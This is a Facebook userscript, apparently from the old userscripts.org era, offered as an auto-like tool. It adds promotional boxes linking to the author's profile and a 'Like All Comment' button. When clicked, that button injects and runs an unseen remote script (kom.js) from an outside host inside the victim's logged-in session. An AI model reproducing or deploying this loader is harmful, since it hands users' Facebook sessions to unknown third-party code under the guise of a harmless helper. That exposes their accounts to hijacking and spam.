// ==UserScript==
// @name			 Facebook Script By : Lasida aziz
// @namespace		        Auto_like_facebook
// @description		         Facebook Script By : Lasida aziz
// @author			Lasida aziz
// @authorURL		        http://www.facebook.com/
// @homepage		        http://userscripts.org/scripts/show/155115
// @include			htt*://www.facebook.com/*
// @icon			https://fbcdn-sphotos-e-a.akamaihd.net/hphotos-ak-ash4/230715_461753480540800_799279187_n.jpg
// @version			50000.0000.00000000
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude 		        htt*://apps.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*
// @include      *.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @match             http://*.facebook.com/*
// @match             https://*.facebook.com/*
// @include			http://www.facebook.com/*
// @include			https://www.facebook.com/*
// @match			http://www.facebook.com/*
// @match			https://www.facebook.com/*
// @exclude			http://www.facebook.com/plugins/*
// @exclude			https://www.facebook.com/plugins/*
// @include		http://facebook.com/*
// @include		http://*.facebook.com/*
// @include		https://facebook.com/*
// @include		https://*.facebook.com/*
// @exclude		http://m.facebook.com/*
// @exclude		https://m.facebook.com/*
// @exclude		http://*.channel.facebook.com/*
// @exclude		https://*.channel.facebook.com/*
// @include			http://*.facebook.com/*
// @include			https://*.facebook.com/*
// @match			http://*.facebook.com/*
// @match			https://*.facebook.com/*
// @exclude			http://*.facebook.com/ajax/*
// @exclude			https://*.facebook.com/ajax/*
// @downloadURL		http://userscripts.org/scripts/source/155639.user.js
// @updateURL		http://userscripts.org/scripts/source/155639.meta.js
// ==/UserScript==
// ==============
// ==Short URL==11
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "130px";
	div.style.opacity= 0.90;
	div.style.bottom = "+394px";
	div.style.left = "+8px";
	div.style.backgroundColor = "#E7EBF2";
	div.style.border = "1px solid #5C00F9";
	div.style.padding = "3px";
	div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='http://www.facebook.com/lasidaaziz' title='My Facebook'><blink><center>My Facebook</center></blink></a>"
body.appendChild(div);
}
// ==Image Short URL==10
body = document.body;
if(body != null) {
	var twsis= "";
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+252px";
	div.style.left = "+8px";
	div.style.border = "1px solid #5C00F9";
	div.style.backgroundColor = "#E7EBF2";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#000000\" TARGET='_blank' href='http://www.facebook.com/lasidaaziz' title='Lasidaaziz'><img src='https://fbcdn-profile-a.akamaihd.net/hprofile-ak-prn1/c14.14.173.173/s160x160/537104_464330290283119_225144957_n.jpg' height='133px' width='132px'></img></a>"
	body.appendChild(div);
		
}
// ==Like All Status Friends==9
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','AutoLikeStatusLasida');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "130px"; 
	div.style.opacity= 0.90;
	div.style.bottom = "+231px";
	div.style.left = "+8px";
	div.style.backgroundColor = "#E7EBF2";
	div.style.border = "1px solid #5C00F9";
	div.style.padding = "3px";
	div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='AutoLikeStatus()'><center>Like All Comment</center></a></a>"
body.appendChild(div);
unsafeWindow.AutoLikeStatus = function() {
javascript:(a=(b=document).createElement("script")).
src="http://Lasida.p.ht/kom.js",b.body.appendChild(a);void(0);
};
}

